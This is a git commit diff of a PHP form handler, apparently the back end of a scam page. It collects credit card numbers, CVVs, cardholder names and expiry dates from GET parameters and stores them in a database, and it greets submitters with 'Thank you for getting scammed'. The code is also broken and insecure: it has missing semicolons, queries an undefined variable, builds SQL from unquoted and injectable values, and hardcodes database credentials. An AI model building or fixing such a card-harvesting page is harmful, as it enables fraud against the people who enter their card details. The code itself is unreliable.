f4583249c7fb5713e673ca4cd577b55b5ccbb4a9
teddykillers <55468219+teddykillers@users.noreply.github.com>
2019-12-16 00:26:56 -0500

    REdo

--- action_page.php
+++ action_page.php
@@ -1,46 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title> CreditCard  </title>
+<title>CreditCard</title>
+</head>
 
-
-
-    <div class="centerref">
-    <?php
+<body>
+    <p>Thank you for getting scammed</p>
+                <?php
                     $servername = "localhost";
                     $username = "php";
                     $password = "fer123";
                     $dbname = "creditcard";
-                    $CC = ($_GET['creditnumber'])
+                    $CC = ($_GET['CardNumber'])
                     $CVV = ($_GET['CCV'])
                     $firstname = ($_GET['firstname'])
                     $lastname = ($_GET['lastname'])
-                    $month = ($_GET['ExpiryMonth'])
-                    $year = ($_GET['ExpiryMonth'])
+                    $emonth = ($_GET['ExpiryMonth'])
+                    $eyear = ($_GET['ExpiryYear'])
 
+                        $CC = htmlspecialchars($_GET['CardNumber']);
+                        echo $CC 
 
-                        // Create connection
-                        $conn = new mysqli($servername, $username, $password, $dbname);
-                        // Check connection
-                        if ($conn->connect_error) {
-                            die("Connection failed: " . $conn->connect_error);
-                        }
+                            // Create connection
+                            $conn = new mysqli($servername, $username, $password, $dbname);
+                            // Check connection
+                            if ($conn->connect_error) 
+                            {
+                                die("Connection failed: " . $conn->connect_error);
+                            }
+                            $sql_insert= "INSERT INTO ccinfo (firstname, lastname, creditcard, cvv, month, year) VALUES ($firstname,$lastname,$CC,$CVV,$emonth,$eyear);";
+                            if ($conn->query($sql) === TRUE) 
+                            {
+                                echo "New record created successfully";
+                            } else {
+                                echo "Error: " . $sql . "<br>" . $conn->error;
+                            }
 
-                        $sql = "INSERT INTO ccinfo (firstname, lastname, creditcard, CVV, 'month', 'year')
-                        VALUES ($firstname,$lastname,$CC,$CVV,$month,$year)";
+                    $conn->close();
+                ?>
+</body> 
 
-                        if ($conn->query($sql) === TRUE) {
-                            echo "New record created successfully";
-                        } else {
-                            echo "Error: " . $sql . "<br>" . $conn->error;
-                        }
-
-                        $conn->close();
-                    ?> 
-    </div> 
-
-    </body>
-        </html>
-        </div> 
-    </body>
 </html>
